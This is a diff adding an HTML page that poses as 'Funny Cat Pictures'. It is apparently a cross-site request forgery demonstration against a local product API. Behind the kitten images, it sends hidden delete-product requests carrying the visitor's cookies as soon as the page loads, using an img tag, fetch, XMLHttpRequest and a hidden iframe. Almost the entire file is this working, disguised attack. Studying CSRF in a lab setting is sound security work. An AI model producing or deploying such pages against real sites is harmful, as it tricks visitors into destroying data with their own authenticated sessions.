@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Funny Cat Pictures</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .cat-container {
+            margin: 20px auto;
+            max-width: 600px;
+        }
+    </style>
+</head>
+<body>
+    <h1>😺 Funny Cat Pictures 😺</h1>
+    <div class="cat-container">
+        <h2>Loading cute cats...</h2>
+        
+        <!-- Malicious img tag that triggers a GET request -->
+        <img src="http://localhost:3000/api/deleteProduct/123" 
+             style="display:none" 
+             onerror="console.log('Product deletion attempted via img tag')">
+        
+        <!-- Malicious script tag that triggers a GET request -->
+        <script>
+            // This will execute when the page loads
+            fetch('http://localhost:3000/api/deleteProduct/456', {
+                credentials: 'include'  // Include cookies in the request
+            }).then(() => console.log('Product deletion attempted via script tag'));
+        </script>
+
+        <!-- Fake cat images to make the page look legitimate -->
+        <img src="https://placekitten.com/400/300" alt="Cute cat 1">
+        <img src="https://placekitten.com/401/300" alt="Cute cat 2">
+    </div>
+
+    <script>
+        // Additional demonstration of GET-based CSRF
+        function demonstrateGetCsrf() {
+            // Method 1: Using fetch
+            fetch('http://localhost:3000/api/deleteProduct/789', {
+                credentials: 'include'
+            });
+
+            // Method 2: Using XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://localhost:3000/api/deleteProduct/101112', true);
+            xhr.withCredentials = true;
+            xhr.send();
+
+            // Method 3: Using an iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'http://localhost:3000/api/deleteProduct/131415';
+            document.body.appendChild(iframe);
+        }
+
+        // Execute the attack when the page loads
+        window.onload = demonstrateGetCsrf;
+    </script>
+</body>
+</html> 
